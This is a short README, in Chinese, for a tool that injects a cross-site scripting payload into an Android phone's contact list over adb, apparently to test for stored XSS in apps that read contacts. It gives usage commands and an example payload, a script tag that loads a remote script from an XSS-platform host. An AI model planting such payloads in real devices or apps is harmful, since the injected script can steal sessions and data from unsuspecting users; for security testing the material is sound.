# xss_spy

**快速的将XSS payload 导入安卓手机通讯录**

## 使用方法

使用前请先测试adb是否正常连接
```bash
./adb_connect.sh
```

运行脚本
```bash
python3 xss_spy "your xss payload"
```

> 你的XSS payload 应该像这样 "xss.cn/xss"
> 比如你使用的xss平台给你的payload是这样的
> ```javascript
> <script src=//xss.cn/xss></script>
> ```
> 那么你输入的参数应该是
> ```bash
> python3 xss_spy "xss.cn/xss"
> ```

![img](./img/xss_spy.gif)

## 关于
快速的将xss payload插入通讯录, 免去了抓包，寻找参数的步骤。
